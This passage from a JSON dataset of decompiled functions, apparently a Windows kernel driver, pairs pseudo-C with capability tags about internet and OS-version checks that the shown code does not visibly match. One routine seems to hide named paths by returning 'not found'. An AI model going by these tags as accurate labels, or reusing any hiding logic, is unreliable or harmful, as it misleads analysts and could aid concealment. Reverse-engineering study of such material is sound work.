        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000170c0(void)\n\n{\n    int16_t iVar1;\n    uint var_2a8h;\n    uint var_2a0h;\n    int16_t *var_29ch;\n    uint var_298h;\n    uint *var_294h;\n    int32_t var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint *var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_68h;\n    uint var_10h;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_8h = 0;\n    if (*0xb1c5a928 != 0) {\n        return 0;\n    }\n    *0xb1c5a928 = 1;\n    fcn.00078550(&var_298h, 0xb1bde64c);\n    var_28ch = 0x18;\n    var_288h = 0;\n    var_280h = 0x240;\n    var_284h = &var_298h;\n    var_27ch = 0;\n    var_278h = 0;\n    var_290h = fcn.00078598(&var_8h, 1, &var_28ch);\n    if (var_290h != 0) {\n        return var_290h;\n    }\n    var_294h = &var_270h;\n    var_298h._0_2_ = 0;\n    var_298h._2_2_ = 0x206;\n    var_290h = fcn.0007858c(var_8h, &var_298h, 0);\n    if (var_290h == 0) {\n        for (var_4h = &var_274h + (var_298h >> 1) * 2 + 2;\n            (((*var_4h == 0x5c || (*var_4h == 0x2f)) || (*var_4h == 0x20)) || (*var_4h == 9)); var_4h = var_4h + -1) {\n        }\n        var_4h[1] = 0;\n        var_4h = fcn.0007859e(&var_270h, 0x5c);\n        if (var_4h != NULL) {\n            var_29ch = var_4h;\n            do {\n                iVar1 = *var_29ch;\n                var_29ch = var_29ch + 1;\n            } while (iVar1 != 0);\n            if ((var_29ch - (var_4h + 1) >> 1) + 1U < 0x105) {\n                fcn.00078592(0xb1c596e0, var_4h + 1, 0x104);\n                fcn.0002bfa0(&var_68h, 0x52);\n                fcn.00078556(0xb1c598e8, 0x52, 0xb1bde644, &var_68h);\n                fcn.00078556(&var_270h, 0x104, 0xb1bde4f4, &var_68h);\n                fcn.00078550(&var_298h, &var_270h);\n                var_28ch = 0x18;\n                var_288h = 0;\n                var_280h = 0x240;\n                var_284h = &var_298h;\n                var_27ch = 0;\n                var_278h = 0;\n                var_290h = fcn.0007856e(&var_8h, 0x100000, &var_28ch, &var_10h, 7, 0x21);\n                if ((var_290h == 0) && (var_290h = (**0xb1bde2a4)(var_8h, 0, 0, 0, &var_274h, 0),  var_290h == 0)) {\n                    if (*(var_274h + 8) == 0) {\n                        (**0xb1bde2e4)();\n                    }\n                    else {\n                        *0xb1c5a930 = *(*(var_274h + 8) + 0xc);\n                        (**0xb1bde2e8)();\n                        *0xb1c5a92c = *(*(var_274h + 8) + 8);\n                        (**0xb1bde2e8)();\n                        (**0xb1bde2e4)();\n                        var_290h = fcn.00016090(*0xb1c5a92c, 0xb1be44c0, 0xb1be4710);\n                    }\n                }\n                goto code_r0x00017406;\n            }\n        }\n        var_290h = -1;\n    }\ncode_r0x00017406:\n    if (var_290h != 0) {\n        fcn.00017430();\n    }\n    if (var_8h != 0) {\n        fcn.00078544(var_8h);\n    }\n    return var_290h;\n}\n",
        "token_count": 1203
    },
    "00017430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00017430(void)\n\n{\n    if (*0xb1c5a928 != 0) {\n        *0xb1c5a928 = 0;\n        if (*0xb1c5a92c != 0) {\n            fcn.00016110(*0xb1c5a92c);\n            (**0xb1bde2e4)();\n            *0xb1c5a92c = 0;\n        }\n        if (*0xb1c5a930 != 0) {\n            (**0xb1bde2e4)();\n            *0xb1c5a930 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "000174c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000174c0(uint arg_8h, int32_t arg_ch, uchar *arg_10h, uint *arg_14h)\n\n{\n    char *pcVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint var_24h;\n    uint var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    *arg_10h = 1;\n    if (*0xb1c5a928 != 0) {\n        *arg_14h = 0x103;\n        cVar3 = fcn.0001f620();\n        if (cVar3 == '\\0') {\n            pcVar1 = *(arg_ch + 0x60);\n            if (((*pcVar1 == '\\f') && (pcVar1[1] == '\\x01')) ||\n               ((*pcVar1 == '\\0' && (iVar4 = fcn.000785a4(),  iVar4 != *(*0xb1c59660 + 0x14))))) {\n                iVar4 = *(pcVar1 + 0x18);\n                if ((*(iVar4 + 0x34) != 0) && (*(iVar4 + 0x30) != 0)) {\n                    for (var_ch = *(iVar4 + 0x30) >> 1; (var_ch != 0 && (*(*(iVar4 + 0x34) + -2 + var_ch * 2) == 0x5c));\n                        var_ch = var_ch - 1) {\n                    }\n                    for (var_8h = 0; (*(*(iVar4 + 0x34) + var_8h * 2) == 0x5c && (var_8h < var_ch)); var_8h = var_8h + 1\n                        ) {\n                    }\n                    var_ch = var_ch - var_8h;\n                    var_18h = 0xb1c596e0;\n                    piVar2 = var_18h;\n                    do {\n                        var_18h = piVar2;\n                        piVar2 = var_18h + 1;\n                    } while (*var_18h != 0);\n                    uVar7 = var_18h + 0x271d3490 >> 1;\n                    if ((var_ch != 0) &&\n                       (iVar5 = fcn.00078538(*(iVar4 + 0x34) + var_8h * 2, 0xb1c596e0, uVar7),  iVar5 == 0)) {\n                        if (*pcVar1 == '\\0') {\n                            for (var_8h = var_8h + uVar7; (*(*(iVar4 + 0x34) + var_8h * 2) == 0x5c && (var_8h < var_ch))\n                                ; var_8h = var_8h + 1) {\n                            }\n                            if ((var_ch - var_8h != 0) &&\n                               (iVar4 = fcn.00078538(*(iVar4 + 0x34) + var_8h * 2, 0xb1c598e8, var_ch - var_8h), \n                               iVar4 == 0)) {\n                                *arg_10h = 0;\n                                *(arg_ch + 0x18) = 0xc0000034;\n                                (**0xb1bde2ec)();\n                                return *(arg_ch + 0x18);\n                            }\n                        }\n                        else if (uVar7 == var_ch) {\n                            uVar6 = fcn.000161e0(arg_8h, arg_ch, 0xb1be4740, arg_14h);\n                            return uVar6;\n                        }\n                    }\n                }\n            }\n            else if (*pcVar1 == '\\n') {\n                uVar6 = fcn.000161e0(arg_8h, arg_ch, 0xb1be4930, 0);\n                return uVar6;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 946
    },
    "00017740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00017740(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_18h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45840;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    if (((var_10h == NULL) || (var_ch == 0)) || (*(var_ch + 0x22) < *(var_ch + 0x23))) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        iVar4 = *(var_ch + 0x60);\n        if (((iVar4 == 0) || (*(iVar4 + 0x14) == 0)) || (*(*(iVar4 + 0x14) + 8) == 0)) {\n            uVar1 = 0xc0000005;\n        }\n        else {\n            if (*(var_ch + 0x18) == 0) {\n                iVar2 = (**0xb1bde294)(*(var_ch + 0x3c), *(var_ch + 0x1c), 0, 0, 0);\n                if (iVar2 == 0) {\n                    *(var_ch + 0x18) = 0xc000009a;\n                    uVar1 = *(var_ch + 0x18);\n                    goto code_r0x00017919;\n                }\n                var_4h = 0;\n                (**0xb1bde2a0)(iVar2, 0, 2);\n                iVar3 = fcn.00017a30(*(iVar4 + 0xc), *(var_ch + 0x3c), *(var_ch + 0x1c));\n                var_4h = 0xffffffff;\n                (**0xb1bde29c)(iVar2);\n                (**0xb1bde2ac)(iVar2);\n                if (*(var_ch + 0x18) == 0) {\n                    if ((iVar3 == -1) && ((*(iVar4 + 2) & 4) == 0)) {\n                        *(iVar4 + 2) = *(iVar4 + 2) & 0xfe;\n                        *(var_ch + 0x23) = *(var_ch + 0x23) + '\\x01';\n                        *(var_ch + 0x60) = *(var_ch + 0x60) + 0x24;\n                        iVar4 = (**0xb1bde290)();\n                        if (iVar4 != 0x103) {\n                            *var_10h = iVar4;\n                        }\n                        uVar1 = 0xc0000016;\n                        goto code_r0x00017919;\n                    }\n                    *(var_ch + 0x1c) = iVar3;\n                }\n            }\n            uVar1 = fcn.000164b0(var_8h, var_ch);\n        }\n    }\ncode_r0x00017919:\n    *in_FS_OFFSET = var_10h_2;\n    return uVar1;\n}\n",
        "token_count": 805
    },
    "00017930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00017930(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch != 0) && (*(arg_ch + 0x23) <= *(arg_ch + 0x22))) {\n        if (*(*(arg_ch + 0x60) + 8) == 3) {\n            iVar1 = *(arg_ch + 0xc);\n            uVar4 = 0x6400000 / (*(iVar1 + 0x10) * *(iVar1 + 0x14));\n            uVar2 = *(iVar1 + 8);\n            *(iVar1 + 8) = uVar4 + *(iVar1 + 8);\n            *(iVar1 + 0xc) = *(iVar1 + 0xc) + CARRY4(uVar4, uVar2);\n        }\n        else if (*(*(arg_ch + 0x60) + 8) == 7) {\n            puVar3 = *(arg_ch + 0xc);\n            uVar4 = 0x6400000 / (puVar3[6] * puVar3[7]);\n            uVar2 = *puVar3;\n            *puVar3 = uVar4 + *puVar3;\n            puVar3[1] = puVar3[1] + CARRY4(uVar4, uVar2);\n            uVar2 = puVar3[2];\n            puVar3[2] = uVar4 + puVar3[2];\n            puVar3[3] = puVar3[3] + CARRY4(uVar4, uVar2);\n            uVar2 = puVar3[4];\n            puVar3[4] = uVar4 + puVar3[4];\n            puVar3[5] = puVar3[5] + CARRY4(uVar4, uVar2);\n        }\n    }\n    fcn.000164b0(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 499
    },
    "00017cf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00017cf0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    if (arg_ch == NULL) {\n        var_4h = 0;\n        for (var_8h = 0; *(arg_8h + var_8h * 4) != 0; var_8h = var_8h + 1) {\n            for (var_10h = 0;\n                (*(*(arg_8h + var_8h * 4) + 0x1c) != 0 && (*(*(*(arg_8h + var_8h * 4) + 0x1c) + var_10h * 4) != 0));\n                var_10h = var_10h + 1) {\n                var_4h = var_4h + 1;\n            }\n            var_4h = var_4h + 1;\n        }\n    }\n    else {\n        var_4h = 1;\n        for (var_8h = 0; *(arg_8h + var_8h * 4) != 0; var_8h = var_8h + 1) {\n            for (var_10h = 0;\n                (*(*(arg_8h + var_8h * 4) + 0x1c) != 0 && (*(*(*(arg_8h + var_8h * 4) + 0x1c) + var_10h * 4) != 0));\n                var_10h = var_10h + 1) {\n                if (*arg_ch < *(*(*(*(arg_8h + var_8h * 4) + 0x1c) + var_10h * 4) + 4)) {\n                    var_4h = var_4h + 1;\n                    var_ch = var_ch + 1;\n                }\n            }\n            if (var_ch != 0) {\n                var_4h = var_4h + 1;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 508
    },
    "00017ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00017ea0(int16_t **arg_8h, int32_t **arg_ch, uint noname_2, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int16_t *piVar3;\n    uint var_60h;\n    int16_t *var_5ch;\n    int16_t *var_58h;\n    uint var_50h;\n    int16_t *var_4ch;\n    int16_t *var_48h;\n    uint var_44h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint var_34h;\n    uint var_2ch;\n    int16_t *var_28h;\n    uint var_24h;\n    int32_t *var_4h;\n    \n    if (arg_8h == NULL) {\n        uVar2 = 0xc0000001;\n    }\n    else if ((arg_14h == 0) || (arg_8h[6] + *arg_18h <= arg_14h)) {\n        var_28h = *arg_8h;\n        piVar3 = var_28h + 1;\n        do {\n            iVar1 = *var_28h;\n            var_28h = var_28h + 1;\n        } while (iVar1 != 0);\n        var_4h = fcn.00035200((var_28h - piVar3 >> 1) * 2 + 0x90);\n        if (var_4h == NULL) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            fcn.00078790(var_4h, 0, 0x70);\n            var_4h[1] = var_4h + 0x8e;\n            var_38h = *arg_8h;\n            piVar3 = var_38h + 1;\n            do {\n                iVar1 = *var_38h;\n                var_38h = var_38h + 1;\n            } while (iVar1 != 0);\n            *var_4h = (var_38h - piVar3 >> 1) * 2 + 2;\n            var_48h = *arg_8h;\n            var_4ch = var_4h[1];\n            do {\n                iVar1 = *var_48h;\n                *var_4ch = iVar1;\n                var_48h = var_48h + 1;\n                var_4ch = var_4ch + 1;\n            } while (iVar1 != 0);\n            var_4h[5] = var_4h + 0x1c;\n            var_4h[4] = 0x1e;\n            var_58h = fcn.00017e30(arg_8h[5], &var_24h);\n            var_5ch = var_4h[5];\n            do {\n                iVar1 = *var_58h;\n                *var_5ch = iVar1;\n                var_58h = var_58h + 1;\n                var_5ch = var_5ch + 1;\n            } while (iVar1 != 0);\n            var_4h[9] = var_4h + 10;\n            var_4h[8] = 4;\n            *var_4h[9] = arg_8h[6];\n            var_4h[0xd] = var_4h + 0xe;\n            var_4h[0xc] = 4;\n            *var_4h[0xd] = arg_8h[2];\n            var_4h[0x11] = var_4h + 0x12;\n            var_4h[0x10] = 4;\n            *var_4h[0x11] = arg_8h[3];\n            var_4h[0x15] = var_4h + 0x16;\n            var_4h[0x14] = 4;\n            *var_4h[0x15] = arg_8h[1];\n            var_4h[0x19] = var_4h + 0x1a;\n            var_4h[0x18] = 4;\n            *var_4h[0x19] = arg_8h[4];\n            *arg_ch = var_4h;\n            if (arg_18h != NULL) {\n                *arg_18h = *arg_18h + arg_8h[6];\n            }\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0xc000009a;\n    }\n    return uVar2;\n}\n",
        "token_count": 1064
    },
    "00018120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00018120(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_14h = 0;\n    do {\n        if (*(arg_8h + var_1ch * 4) == 0) {\n            return 0;\n        }\n        arg_8h_00 = *(arg_8h + var_1ch * 4);\n        bVar3 = arg_10h == NULL;\n        if (!bVar3) {\n            var_4h = 0;\n            while( true ) {\n                if ((*(arg_8h_00 + 0x1c) == 0) || (*(*(arg_8h_00 + 0x1c) + var_4h * 4) == 0)) goto code_r0x000181b7;\n                if (*arg_10h < *(*(*(arg_8h_00 + 0x1c) + var_4h * 4) + 4)) break;\n                var_4h = var_4h + 1;\n            }\n            bVar3 = true;\n        }\ncode_r0x000181b7:\n        if (bVar3) {\n            fcn.00017ea0(arg_8h_00, arg_ch + var_14h * 4, 1, arg_14h, arg_18h);\n            var_14h = var_14h + 1;\n            for (var_4h = 0; (*(arg_8h_00 + 0x1c) != 0 && (*(*(arg_8h_00 + 0x1c) + var_4h * 4) != 0));\n                var_4h = var_4h + 1) {\n                if ((arg_10h == NULL) || (*arg_10h < *(*(*(arg_8h_00 + 0x1c) + var_4h * 4) + 4))) {\n                    iVar1 = fcn.00017ea0(*(*(arg_8h_00 + 0x1c) + var_4h * 4), arg_ch + var_14h * 4, 0, arg_14h, arg_18h)\n                    ;\n                    var_14h = var_14h + 1;\n                    if (iVar1 != 0) {\n                        uVar2 = fcn.000785b6(iVar1);\n                        return uVar2;\n                    }\n                }\n            }\n        }\n        var_1ch = var_1ch + 1;\n    } while( true );\n}\n",
        "token_count": 690
    },
    "000182a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.000182a0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x1c);\n    if (arg_8h_00 == NULL) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        iVar1 = fcn.00035200(arg_ch * 2 + 2);\n        *arg_8h_00 = iVar1;\n        if (*arg_8h_00 == 0) {\n            fcn.00035330(arg_8h_00);\n            arg_8h_00 = NULL;\n        }\n        else {\n            fcn.0007877e(*arg_8h_00, arg_8h, arg_ch << 1);\n            *(*arg_8h_00 + arg_ch * 2) = 0;\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 332
    },
    "00018330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00018330(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t iVar2;\n    uint var_24h;\n    uint var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x20);\n    if (arg_8h_00 == NULL) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        arg_8h_00[7] = 0;\n        if (*arg_8h == 0) {\n            iVar2 = fcn.00035200(0x208);\n            *arg_8h_00 = iVar2;\n            if (*arg_8h_00 == 0) {\n                fcn.00035330(arg_8h_00);\n                return NULL;\n            }\n            fcn.0002bd00(*arg_8h_00, 0x104);\n        }\n        else {\n            var_8h = arg_8h;\n            do {\n                iVar1 = *var_8h;\n                var_8h = var_8h + 1;\n            } while (iVar1 != 0);\n            if (arg_8h[(var_8h - (arg_8h + 1) >> 1) + -1] == 0x5c) {\n                iVar2 = fcn.000353f0(arg_8h);\n                *arg_8h_00 = iVar2;\n                if (*arg_8h_00 == 0) {\n                    fcn.00035330(arg_8h_00);\n                    return NULL;\n                }\n            }\n            else {\n                var_18h = arg_8h;\n                do {\n                    iVar1 = *var_18h;\n                    var_18h = var_18h + 1;\n                } while (iVar1 != 0);\n                iVar2 = fcn.00035200((var_18h - (arg_8h + 1) >> 1) * 2 + 4);\n                *arg_8h_00 = iVar2;\n                if (*arg_8h_00 == 0) {\n                    fcn.00035330(arg_8h_00);\n                    return NULL;\n                }\n                fcn.000785aa(*arg_8h_00, 0xb1bde664, arg_8h);\n            }\n        }\n        arg_8h_00[5] = 0x10;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 702
    },
    "000184b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000184b0(uint arg_8h, int32_t *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_290h;\n    uint *var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint *var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    int32_t var_26ch;\n    uint32_t var_268h;\n    int32_t var_264h;\n    uint32_t var_260h;\n    int32_t var_25ch;\n    uint32_t var_258h;\n    int32_t var_254h;\n    uint32_t var_250h;\n    int32_t var_24ch;\n    uint var_248h;\n    uint *var_240h;\n    int32_t var_23ch;\n    uint var_238h;\n    int32_t var_234h;\n    uint var_230h;\n    uint var_24h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_1ch = 0;\n    var_238h = 0x268;\n    var_288h = NULL;\n    if (arg_10h == NULL) {\n        var_26ch = 0x21590066;\n    }\n    else {\n        arg_10h[7] = 0;\n        var_23ch = fcn.00035200(0x268);\n        if (var_23ch == 0) {\n            var_26ch = 0x21590004;\n        }\n        else {\n            var_1ch = var_23ch;\n            fcn.00078790(var_23ch, 0, var_238h);\n            var_288h = fcn.00035200(4);\n            if (var_288h == NULL) {\n                var_26ch = 0x21590004;\n            }\n            else {\n                *var_288h = 0;\n                fcn.00078550(&var_10h, arg_8h);\n                fcn.000364b0(&var_230h, 0x104, *arg_10h);\n                fcn.00078550(&var_290h, &var_230h);\n                var_284h = 0x18;\n                var_280h = 0;\n                var_278h = 0x40;\n                var_27ch = &var_290h;\n                var_274h = 0;\n                var_270h = 0;\n                var_234h = fcn.0001ec90(&var_8h, 0x100001, &var_284h, &var_24h, 0, 0x80, 7, 1, 0x10, 0, 0);\n                if (var_234h == 0) {\n                    var_234h = fcn.000785c2(var_8h, &var_24h, &var_268h, 0x28, 4);\n                    if (var_234h == 0) {\n                        uVar1 = fcn.00078784(var_258h + 0x2ac18000, (var_254h + -0x19db1de) - (var_258h < 0xd53e8000), \n                                             10000000, 0);\n                        arg_10h[1] = uVar1;\n                        uVar1 = fcn.00078784(var_268h + 0x2ac18000, (var_264h + -0x19db1de) - (var_268h < 0xd53e8000), \n                                             10000000, 0);\n                        arg_10h[2] = uVar1;\n                        uVar1 = fcn.00078784(var_250h + 0x2ac18000, (var_24ch + -0x19db1de) - (var_250h < 0xd53e8000), \n                                             10000000, 0);\n                        arg_10h[4] = uVar1;\n                        uVar1 = fcn.00078784(var_260h + 0x2ac18000, (var_25ch + -0x19db1de) - (var_260h < 0xd53e8000), \n                                             10000000, 0);\n                        arg_10h[3] = uVar1;\n                        arg_10h[5] = var_248h;\n                    }\n                    arg_10h[6] = 0;\n                    var_18h = 0;\n                    var_4h = 0;\n                    while (var_234h = fcn.000785b0(var_8h, 0, 0, 0, &var_24h, var_1ch, var_238h, 3, 1, &var_10h, \n                                                   var_18h == 0),  var_234h == 0) {\n                        if ((((*(var_23ch + 0x3c) >> 1 != 1) ||\n                             (iVar2 = fcn.000785bc(var_23ch + 0x5e, 0xb1bde66c, 1),  iVar2 != 0)) &&\n                            ((*(var_23ch + 0x3c) >> 1 != 2 ||\n                             (iVar2 = fcn.000785bc(var_23ch + 0x5e, 0xb1bde670, 2),  iVar2 != 0)))) &&\n                           (((arg_10h[6] = arg_10h[6] + *(var_23ch + 0x28),  arg_ch == NULL ||\n                             ((*(var_23ch + 0x38) & 0x10) != 0)) ||\n                            (var_14h = fcn.00078784(*(var_23ch + 0x18) + 0x2ac18000, \n                                                    (*(var_23ch + 0x1c) + -0x19db1de) -\n                                                    (*(var_23ch + 0x18) < 0xd53e8000), 10000000, 0),  *arg_ch <= var_14h\n                            )))) {\n                            var_240h = var_288h;\n                            iVar2 = fcn.0001d7c0(&var_288h, var_4h * 4 + 4, var_4h * 4 + 8);\n                            if (iVar2 == -1) {\n                                var_288h = var_240h;\n                                var_26ch = 0x21590004;\n                                goto code_r0x00018a4d;\n                            }\n                            var_288h[var_4h + 1] = 0;\n                            uVar1 = fcn.000182a0(var_23ch + 0x5e, *(var_23ch + 0x3c) >> 1);\n                            var_288h[var_4h] = uVar1;\n                            if (var_288h[var_4h] == 0) {\n                                var_26ch = 0x21590004;\n                                goto code_r0x00018a4d;\n                            }\n                            uVar1 = fcn.00078784(*(var_23ch + 0x18) + 0x2ac18000, \n                                                 (*(var_23ch + 0x1c) + -0x19db1de) - (*(var_23ch + 0x18) < 0xd53e8000), \n                                                 10000000, 0);\n                            *(var_288h[var_4h] + 4) = uVar1;\n                            uVar1 = fcn.00078784(*(var_23ch + 8) + 0x2ac18000, \n                                                 (*(var_23ch + 0xc) + -0x19db1de) - (*(var_23ch + 8) < 0xd53e8000), \n                                                 10000000, 0);\n                            *(var_288h[var_4h] + 8) = uVar1;\n                            uVar1 = fcn.00078784(*(var_23ch + 0x20) + 0x2ac18000, \n                                                 (*(var_23ch + 0x24) + -0x19db1de) - (*(var_23ch + 0x20) < 0xd53e8000), \n                                                 10000000, 0);\n                            *(var_288h[var_4h] + 0x10) = uVar1;\n                            uVar1 = fcn.00078784(*(var_23ch + 0x10) + 0x2ac18000, \n                                                 (*(var_23ch + 0x14) + -0x19db1de) - (*(var_23ch + 0x10) < 0xd53e8000), \n                                                 10000000, 0);\n                            *(var_288h[var_4h] + 0xc) = uVar1;\n                            *(var_288h[var_4h] + 0x14) = *(var_23ch + 0x38);\n                            if ((*(var_23ch + 0x38) & 0x10) == 0) {\n                                *(var_288h[var_4h] + 0x18) = *(var_23ch + 0x28);\n                            }\n                            else {\n                                *(var_288h[var_4h] + 0x18) = 0;\n                            }\n                            var_4h = var_4h + 1;\n                        }\n                        var_18h = var_18h + 1;\n                    }\n                    if (var_234h == -0x7ffffffa) {\n                        var_26ch = 0;\n                    }\n                    else {\n                        var_26ch = fcn.000785b6(var_234h);\n                    }\n                    if (var_26ch == 0) {\n                        arg_10h[7] = var_288h;\n                    }\n                }\n                else {\n                    var_26ch = fcn.000785b6(var_234h);\n                }\n            }\ncode_r0x00018a4d:\n            if ((var_288h != NULL) && (var_26ch != 0)) {\n                for (var_18h = 0; var_288h[var_18h] != 0; var_18h = var_18h + 1) {\n                    fcn.00018e20(var_288h[var_18h]);\n                }\n                fcn.00035330(var_288h);\n            }\n            fcn.00035330(var_1ch);\n            if (var_8h != 0) {\n                fcn.00078544(var_8h);\n            }\n        }\n    }\n    return var_26ch;\n}\n",
        "token_count": 2493
    },
    "00018ad0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00018ad0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *(arg_8h + 0x1c);\n    var_4h = 0;\n    for (var_8h = 0; (iVar1 != 0 && (*(iVar1 + var_8h * 4) != 0)); var_8h = var_8h + 1) {\n        if ((*(*(iVar1 + var_8h * 4) + 0x14) & arg_ch) != 0) {\n            var_4h = var_4h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 188
    },
    "00018b30": {
        "rules": [
